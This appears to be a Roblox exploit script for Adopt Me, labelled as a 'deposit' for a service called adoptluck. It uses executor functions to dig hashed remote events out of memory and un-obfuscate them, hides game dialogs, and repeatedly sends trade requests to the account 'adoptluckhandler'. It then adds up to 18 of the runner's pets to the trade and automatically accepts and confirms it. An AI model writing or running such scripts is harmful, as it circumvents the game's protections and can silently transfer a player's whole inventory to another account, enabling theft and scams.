-- DEPOSIT
-- my adoptluck
print("STARTING")

-- important
task.wait(30)
local router

for i, v in next, getgc(true) do
    if type(v) == 'table' and rawget(v, 'get_remote_from_cache') then
        router = v
    end
end

local function rename(remotename, hashedremote)
    hashedremote.Name = remotename
end
table.foreach(debug.getupvalue(router.get_remote_from_cache, 1), rename)
task.wait(1)
local NewsApp = game:GetService("Players").LocalPlayer.PlayerGui.NewsApp.Enabled
local sound = require(game.ReplicatedStorage:WaitForChild("Fsys")).load("SoundPlayer")
local UI = require(game.ReplicatedStorage:WaitForChild("Fsys")).load("UIManager")
sound.FX:play("BambooButton")
UI.set_app_visibility("NewsApp", false)
UI.set_app_visibility("DialogApp", false)
local myUsername = game:GetService("Players").LocalPlayer.Name
local NewsApp = game:GetService("Players").LocalPlayer.PlayerGui.NewsApp.Enabled
local sound = require(game.ReplicatedStorage:WaitForChild("Fsys")).load("SoundPlayer")
local UI = require(game.ReplicatedStorage:WaitForChild("Fsys")).load("UIManager")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local DataApiHook = game.ReplicatedStorage:WaitForChild("API"):WaitForChild("DataAPI/DataChanged")
local TradeApiHook = game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild(
    "TradeAPI/TradeRequestReceived")
getgenv().fsys = require(game:GetService("ReplicatedStorage").ClientModules.Core.ClientData)
local inventory = fsys.get("inventory")
local inventoryPets = inventory and inventory.pets or {}

sound.FX:play("BambooButton")
UI.set_app_visibility("NewsApp", false)
UI.set_app_visibility("DialogApp", false)

task.wait(10)
-- SEND A TRADE REQUEST TO THE BOT UNTIL IT ACCEPTS MUST HAVE 10 SECONDS DELAY

-- GLOBAL VARIABLES
getgenv().in_trade = false
getgenv().in_trade_with = nil

--------------------------------------------HOOKS------------------------------------------------------------------------------------
DataApiHook.OnClientEvent:Connect(function(...)
    local args = {...}
    local sender, recipient -- declare outside

    if typeof(args[3]) == "table" then
        local tradeTable = args[3]
        local tradeId = tradeTable.trade_id
        if not tradeId then return end

        sender = tradeTable.sender_offer
        recipient = tradeTable.recipient_offer
        if not (sender and recipient) then return end
    end

    if args[2] == "in_active_trade" then
        getgenv().in_trade = true
        if args[1] ~= myUsername then
            getgenv().in_trade_with = args[1]
        end
    end

    if recipient and recipient.negotiated and not recipient.confirmed then
        game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/ConfirmTrade"):FireServer()
    end
end)

local TradeApiHook = game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild(
    "TradeAPI/TradeRequestReceived")

TradeApiHook.OnClientEvent:Connect(function(...)
    local args = {...}
    for i, v in ipairs(args) do
        print("Arg " .. i .. ":", v)
    end
end)

while not getgenv().in_trade do
    -- send trade req
    local args = {game:GetService("Players"):WaitForChild("adoptluckhandler")}
    game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/SendTradeRequest"):FireServer(
        unpack(args))
    task.wait(10)
end

while getgenv().in_trade do
    local addedCount = 0

    for x, y in pairs(inventoryPets) do
        if y.kind ~= "starter_egg" then
            if addedCount < 18 then
                local args = {y.unique}
                game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/AddItemToOffer"):FireServer(unpack(args))
                print("added " .. y.kind)
                addedCount += 1
                task.wait(1)

                -- if we just hit 18, negotiate and stop adding
                if addedCount == 18 then
                    print("Reached 18 items, negotiating...")
                    task.wait(10)
                    game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/AcceptNegotiation"):FireServer()
                    break
                end
            end
        end
    end

    -- if under 18 pets total, negotiate after adding all of them
    if addedCount < 18 then
        print("Under 18 items (" .. addedCount .. "), negotiating...")
        game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/AcceptNegotiation"):FireServer()
    end

    break
end

